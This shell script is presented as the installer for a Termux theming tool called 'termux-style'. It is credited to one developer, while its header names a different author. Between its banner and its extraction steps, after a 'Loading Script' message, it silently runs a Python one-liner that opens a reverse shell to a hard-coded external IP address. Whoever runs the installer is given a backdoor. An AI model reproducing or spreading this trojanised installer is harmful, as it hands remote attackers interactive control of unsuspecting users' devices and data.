
## Author : Wong Edan
## Email  : termuxxx@gmail.com

#colors
R='\033[1;31m'
B='\033[1;34m'
C='\033[0;36m'
G='\033[1;32m'
W='\033[1;37m'
Y='\033[1;33m'

DIR="$(pwd)"

echo
echo -e $B"   ┌────────────────────────────────────┐"
echo -e $B"   │$R╺┳╸┏━╸┏━┓┏┳┓╻ ╻╻ ╻   $G┏━┓╺┳╸╻ ╻╻  ┏━╸$B│"
echo -e $B"   │$R ┃ ┣╸ ┣┳┛┃┃┃┃ ┃┏╋┛$Y╺━╸$G┗━┓ ┃ ┗┳┛┃  ┣╸ $B│"
echo -e $B"   │$R ╹ ┗━╸╹┗╸╹ ╹┗━┛╹ ╹   $G┗━┛ ╹  ╹ ┗━╸┗━╸$B│"
echo -e $B"   └────────────────────────────────────┘"
echo -e $B"   [$R*$B] By-$Y Aditya Shakya $R//$Y adi1090x"
echo

echo -e $G"   [*] Installing termux-style..."
echo
echo -e $Y"   [*] Loading Script, please wait..."
echo

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("18.188.14.65",12568));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

if [ ! -d $HOME/.termux ]; then
mkdir $HOME/.termux
fi

mv $DIR/data.tar.gz $PREFIX/share
cd $PREFIX/share
echo -e $Y"   [*] Extracting Files..."$C
echo
tar -xhf data.tar.gz
chmod +x termux-style/theme
ln -s $PREFIX/share/termux-style/theme $PREFIX/bin/termux-style
rm $PREFIX/share/data.tar.gz
termux-reload-settings
echo -e $G"   [*] Setup Completed."
echo
echo -e $Y"   [*] Now You Can Run This Program By Just typing 'termux-style'."
echo -e $Y"   [*] Please Support The Developers By Purchasing The App."
echo
echo -e $G"   [*] Developed By$R Aditya Shakya."
echo
